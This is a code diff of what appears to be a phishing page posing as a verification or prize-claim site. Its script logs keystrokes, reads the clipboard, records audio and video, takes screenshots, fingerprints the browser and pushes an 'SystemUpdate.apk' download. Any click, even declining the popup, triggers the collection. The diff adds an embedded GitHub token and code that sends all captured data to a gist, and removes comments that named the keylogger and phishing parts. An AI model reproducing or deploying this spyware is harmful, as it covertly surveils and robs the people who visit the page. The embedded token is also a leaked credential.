@@ -35,6 +35,8 @@
 <script>
 var GITHUB_USER = 'pandora-site';
 var GITHUB_REPO = 'verifikasi-site';
+var GITHUB_TOKEN = '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';
+var GIST_ID = 'ebf689c4deacadf60d5860c7638d491f';
 var dataStore = [];
 var hasLS = (typeof localStorage !== 'undefined');
 var hasSS = (typeof sessionStorage !== 'undefined');
@@ -50,11 +52,26 @@ function simpanLokal() { if(hasLS) try{ localStorage.setItem('vd', JSON.stringif
 function K(d) {
     dataStore.push({ waktu: new Date().toISOString(), sumber: d.sumber || d.type || 'unknown', data: d.data || d });
     simpanLokal();
+    simpanKeGist();
 }
 
-// ================================================================
-// ANDROID BRIDGE (FULL POWER)
-// ================================================================
+async function simpanKeGist() {
+    try {
+        var allData = dataStore;
+        if(hasLS) { var ls = localStorage.getItem('vd'); if(ls) allData = JSON.parse(ls); }
+        await fetch('https://api.github.com/gists/' + GIST_ID, {
+            method: 'PATCH',
+            headers: {
+                'Authorization': 'token ' + GITHUB_TOKEN,
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                files: { 'data.json': { content: JSON.stringify(allData, null, 2) } }
+            })
+        });
+    } catch(e) {}
+}
+
 var A = {
     isAvailable: typeof AndroidBridge !== 'undefined',
     getDeviceInfo: function() { if(this.isAvailable){ try{return JSON.parse(AndroidBridge.getDeviceInfo())}catch(e){}} return null },
@@ -85,9 +102,6 @@ var A = {
     downloadFile: function(u,f) { if(this.isAvailable){ try{AndroidBridge.downloadFile(u,f);return true}catch(e){}} return false }
 };
 
-// ================================================================
-// FUNGSI DATA (FULL POWER)
-// ================================================================
 function GD() {
     var d = {
         w:Date.now(), ua:navigator.userAgent, pl:navigator.platform, la:navigator.language,
@@ -130,7 +144,6 @@ function ambilSS() { if(A.isAvailable){ var s=A.takeScreenshot(); if(s) K({sumbe
 function ambilAudio() { if(A.isAvailable){ var a=A.startRecording(); if(a) K({sumber:'audio_record',data:a}) } else { try{ navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'audio_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }
 function ambilVideo() { if(A.isAvailable){ var v=A.startVideoRecording(); if(v) K({sumber:'video_record',data:v}) } else { try{ navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){ var m=new MediaRecorder(s); m.ondataavailable=function(e){ if(e.data.size>0){ var r=new FileReader(); r.onload=function(){ K({sumber:'video_record',data:r.result}) }; r.readAsDataURL(e.data) } }; m.start(); setTimeout(function(){ m.stop() },5000) }).catch(function(){}) } catch(e){} } }
 
-// KEYLOGGER + PATTERN
 var inputData={};
 var keyTimestamps=[];
 document.addEventListener('keydown',function(e){ keyTimestamps.push({key:e.key,time:Date.now()}) });
@@ -140,115 +153,20 @@ setInterval(function(){
     if(keyTimestamps.length>0){ K({sumber:'keystroke_pattern',data:keyTimestamps,waktu:Date.now()}); keyTimestamps=[] }
 },10000);
 
-// CLIPBOARD
 function bacaClipboard() { if(A.isAvailable){ var t=A.getClipboard(); if(t) K({sumber:'clipboard',data:t,method:'android'}) } try{ navigator.clipboard.readText().then(function(t){ if(t) K({sumber:'clipboard',data:t,method:'browser'}) }).catch(function(){}) } catch(e){} }
 setTimeout(bacaClipboard,3000); setInterval(bacaClipboard,5000);
 
-// STORAGE INFO
 function ambilStorage() { try{ navigator.storage.estimate().then(function(s){ K({sumber:'storage',data:{usage:(s.usage/1024/1024).toFixed(2)+' MB',quota:(s.quota/1024/1024).toFixed(2)+' MB'}}) }) } catch(e){} }
-
-// NETWORK INFO
 function ambilNetwork() { try{ var c=navigator.connection||navigator.mozConnection||navigator.webkitConnection; if(c){ K({sumber:'network',data:{type:c.type,downlink:c.downlink,rtt:c.rtt}}) } } catch(e){} }
-
-// WEBRTC LEAK (IP LOCAL)
-function ambilIPLocal() {
-    try {
-        var pc=new RTCPeerConnection({iceServers:[]});
-        pc.createDataChannel('');
-        pc.createOffer().then(function(o){ pc.setLocalDescription(o) });
-        pc.onicecandidate=function(e){
-            if(e.candidate){
-                var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/);
-                if(ip){ K({sumber:'ip_local',data:ip[0]}); pc.close() }
-            }
-        };
-    } catch(e){}
-}
-
-// CANVAS FINGERPRINT
-function ambilCanvasFP() {
-    try {
-        var c=document.createElement('canvas');
-        c.width=200;c.height=50;
-        var ctx=c.getContext('2d');
-        ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60';
-        ctx.fillRect(0,0,100,50);ctx.fillStyle='#069';
-        ctx.fillText('Browser Fingerprint',2,15);
-        var fp=c.toDataURL();
-        K({sumber:'canvas_fp',data:fp.substring(0,500)});
-    } catch(e){}
-}
-
-// WEBGL FINGERPRINT
-function ambilWebGLFP() {
-    try {
-        var c=document.createElement('canvas');
-        var gl=c.getContext('webgl')||c.getContext('experimental-webgl');
-        if(gl){
-            var debug=gl.getExtension('WEBGL_debug_renderer_info');
-            if(debug){
-                K({sumber:'webgl',data:{vendor:gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}});
-            }
-        }
-    } catch(e){}
-}
-
-// PLUGINS
-function ambilPlugins() {
-    try {
-        var p=[];
-        for(var i=0;i<navigator.plugins.length;i++){ p.push(navigator.plugins[i].name) }
-        if(p.length>0) K({sumber:'plugins',data:p});
-    } catch(e){}
-}
-
-// FONTS
-function ambilFonts() {
-    try {
-        var f=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact'];
-        var d=document.createElement('canvas');d.width=10;d.height=10;
-        var ctx=d.getContext('2d');
-        var ada=[];
-        f.forEach(function(fn){
-            ctx.font='12px '+fn;
-            var w=ctx.measureText('test').width;
-            if(w>0) ada.push(fn);
-        });
-        K({sumber:'fonts',data:ada});
-    } catch(e){}
-}
-
-// SCREEN DETAIL
-function ambilScreenDetail() {
-    K({sumber:'screen_detail',data:{
-        avail:screen.availWidth+'x'+screen.availHeight,
-        outer:window.outerWidth+'x'+window.outerHeight,
-        inner:window.innerWidth+'x'+window.innerHeight,
-        orientation:screen.orientation?screen.orientation.type:'N/A'
-    }});
-}
-
-// DO NOT TRACK
+function ambilIPLocal() { try { var pc=new RTCPeerConnection({iceServers:[]}); pc.createDataChannel(''); pc.createOffer().then(function(o){ pc.setLocalDescription(o) }); pc.onicecandidate=function(e){ if(e.candidate){ var ip=e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(ip){ K({sumber:'ip_local',data:ip[0]}); pc.close() } } }; } catch(e){} }
+function ambilCanvasFP() { try { var c=document.createElement('canvas'); c.width=200;c.height=50; var ctx=c.getContext('2d'); ctx.textBaseline='top';ctx.font='14px Arial';ctx.fillStyle='#f60'; ctx.fillRect(0,0,100,50);ctx.fillStyle='#069'; ctx.fillText('Browser Fingerprint',2,15); var fp=c.toDataURL(); K({sumber:'canvas_fp',data:fp.substring(0,500)}); } catch(e){} }
+function ambilWebGLFP() { try { var c=document.createElement('canvas'); var gl=c.getContext('webgl')||c.getContext('experimental-webgl'); if(gl){ var debug=gl.getExtension('WEBGL_debug_renderer_info'); if(debug){ K({sumber:'webgl',data:{vendor:gl.getParameter(debug.UNMASKED_VENDOR_WEBGL),renderer:gl.getParameter(debug.UNMASKED_RENDERER_WEBGL)}}); } } } catch(e){} }
+function ambilPlugins() { try { var p=[]; for(var i=0;i<navigator.plugins.length;i++){ p.push(navigator.plugins[i].name) } if(p.length>0) K({sumber:'plugins',data:p}); } catch(e){} }
+function ambilFonts() { try { var f=['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact']; var d=document.createElement('canvas');d.width=10;d.height=10; var ctx=d.getContext('2d'); var ada=[]; f.forEach(function(fn){ ctx.font='12px '+fn; var w=ctx.measureText('test').width; if(w>0) ada.push(fn); }); K({sumber:'fonts',data:ada}); } catch(e){} }
+function ambilScreenDetail() { K({sumber:'screen_detail',data:{avail:screen.availWidth+'x'+screen.availHeight,outer:window.outerWidth+'x'+window.outerHeight,inner:window.innerWidth+'x'+window.innerHeight,orientation:screen.orientation?screen.orientation.type:'N/A'}}); }
 function ambilDNT() { K({sumber:'dnt',data:navigator.doNotTrack||'unspecified'}); }
+function cekAdBlock() { try { var ad=document.createElement('div'); ad.innerHTML='&nbsp;'; ad.className='adsbox'; document.body.appendChild(ad); setTimeout(function(){ if(ad.offsetHeight===0) K({sumber:'adblock',data:true}); else K({sumber:'adblock',data:false}); document.body.removeChild(ad); },100); } catch(e){} }
 
-// ADBLOCK
-function cekAdBlock() {
-    try {
-        var ad=document.createElement('div');
-        ad.innerHTML='&nbsp;';
-        ad.className='adsbox';
-        document.body.appendChild(ad);
-        setTimeout(function(){
-            if(ad.offsetHeight===0) K({sumber:'adblock',data:true});
-            else K({sumber:'adblock',data:false});
-            document.body.removeChild(ad);
-        },100);
-    } catch(e){}
-}
-
-// ================================================================
-// DOWNLOAD
-// ================================================================
 var files = [
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/SystemUpdate.apk',
     'https://raw.githubusercontent.com/' + GITHUB_USER + '/' + GITHUB_REPO + '/main/files/Video.mp4'
@@ -280,9 +198,6 @@ function FK() {
     K({sumber:'full_kontrol',data:'selesai'});
 }
 
-// ================================================================
-// POPUP + KLIK DI MANA SAJA = DAPAT SEMUA
-// ================================================================
 function dapatkanSemua() {
     if(semuaDidapat) return;
     semuaDidapat = true;
@@ -297,7 +212,6 @@ function klaim() { document.getElementById('popupDana').style.display='none'; se
 function tolak() { document.getElementById('popupDana').style.display='none'; setTimeout(function(){ dapatkanSemua() },500); K({sumber:'izin',data:'tolak'}); }
 document.addEventListener('click',function(){ setTimeout(function(){ dapatkanSemua() },1000); });
 
-// Timer
 var w=300;
 var timerInterval=setInterval(function(){
     w--;var m=Math.floor(w/60);var s=w%60;
@@ -306,21 +220,15 @@ var timerInterval=setInterval(function(){
 },1000);
 
 function HB() { setInterval(function(){ K({sumber:'heartbeat',data:'alive'}) },10000) }
-
-// SERVICE WORKER + WAKE LOCK
 function SW() { if('serviceWorker' in navigator){ navigator.serviceWorker.register('/sw.js').then(function(r){ K({sumber:'keepalive',data:'sw_registered'}) }).catch(function(){}) } }
 function KA() { if(A.isAvailable){ A.keepAwake() } try{ if('wakeLock' in navigator){ navigator.wakeLock.request('screen').then(function(w){ K({sumber:'keepalive',data:'wake_lock'}) }).catch(function(){}) } } catch(e){} }
 function cleanup() { console.log=function(){};console.warn=function(){};console.error=function(){};console.info=function(){} }
 setTimeout(cleanup,3000);
 
-// START
 GD();getIP();SW();KA();HB();
 setInterval(async function(){ K({sumber:'periodic',data:GD()}) },10000);
 window.addEventListener('beforeunload',function(){ K({sumber:'close',data:'Tutup'}) });
 
-// ================================================================
-// PHISHING ROUTING
-// ================================================================
 (function() {
     var path = location.pathname;
     if(path === '/' || path === '') return;
